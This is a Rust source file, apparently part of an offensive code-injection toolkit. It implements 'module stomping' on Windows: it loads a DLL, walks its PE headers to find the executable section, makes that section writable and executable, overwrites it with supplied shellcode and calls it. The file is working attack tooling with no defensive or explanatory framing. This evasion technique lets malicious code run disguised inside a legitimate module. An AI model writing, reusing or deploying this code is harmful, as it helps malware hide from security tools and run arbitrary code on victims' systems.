#![allow(unused)]

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    System::{
        LibraryLoader::LoadLibraryA,
        Memory::VirtualProtect,
        Threading::GetCurrentProcess,
        Diagnostics::Debug::FlushInstructionCache,
    },
};

const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;

#[cfg(target_os = "windows")]
pub fn inject_stomp(module_name: &str, shellcode: &[u8]) -> super::InjectResult {
    use std::ffi::CString;
    use core::ptr::null_mut;

    let mod_cstr = CString::new(module_name).map_err(|_| "invalid module name")?;

    let hmod = unsafe { LoadLibraryA(mod_cstr.as_ptr() as *const u8) };
    if hmod == 0 {
        return Err("LoadLibraryA failed");
    }

    let base = hmod as *const u8;

    let (section_ptr, section_size) = find_text_section(base).ok_or("no executable section")?;

    if section_size < shellcode.len() {
        return Err("section too small for shellcode");
    }

    let mut old_prot: u32 = 0;
    let ok = unsafe {
        VirtualProtect(
            section_ptr as *const core::ffi::c_void,
            section_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_prot,
        )
    };
    if ok == 0 {
        return Err("VirtualProtect failed");
    }

    unsafe {
        core::ptr::copy_nonoverlapping(shellcode.as_ptr(), section_ptr, shellcode.len());
        FlushInstructionCache(GetCurrentProcess(), section_ptr as *const core::ffi::c_void, shellcode.len());
    }

    let exec: unsafe fn() = unsafe { core::mem::transmute(section_ptr) };
    unsafe { exec() };

    Ok(())
}

#[cfg(target_os = "windows")]
fn find_text_section(base: *const u8) -> Option<(*mut u8, usize)> {
    let pe = unsafe { core::slice::from_raw_parts(base, 0x1000) };

    let e_magic = u16::from_le_bytes([pe[0], pe[1]]);
    if e_magic != 0x5A4D { return None; }

    let e_lfanew = u32::from_le_bytes([pe[0x3C], pe[0x3D], pe[0x3E], pe[0x3F]]) as usize;
    let nt = e_lfanew;
    let sig = u32::from_le_bytes([pe[nt], pe[nt+1], pe[nt+2], pe[nt+3]]);
    if sig != 0x00004550 { return None; }

    let fh = nt + 4;
    let num_sections = u16::from_le_bytes([pe[fh+2], pe[fh+3]]) as usize;
    let size_of_opt = u16::from_le_bytes([pe[fh+16], pe[fh+17]]) as usize;
    let sh_base = fh + 20 + size_of_opt;

    for i in 0..num_sections {
        let s = sh_base + i * 40;
        let characteristics = u32::from_le_bytes([pe[s+36], pe[s+37], pe[s+38], pe[s+39]]);
        if characteristics & IMAGE_SCN_MEM_EXECUTE != 0 {
            let virtual_address = u32::from_le_bytes([pe[s+12], pe[s+13], pe[s+14], pe[s+15]]);
            let virtual_size = u32::from_le_bytes([pe[s+8],  pe[s+9],  pe[s+10], pe[s+11]]);
            let ptr = unsafe { (base as *mut u8).add(virtual_address as usize) };
            return Some((ptr, virtual_size as usize));
        }
    }
    None
}
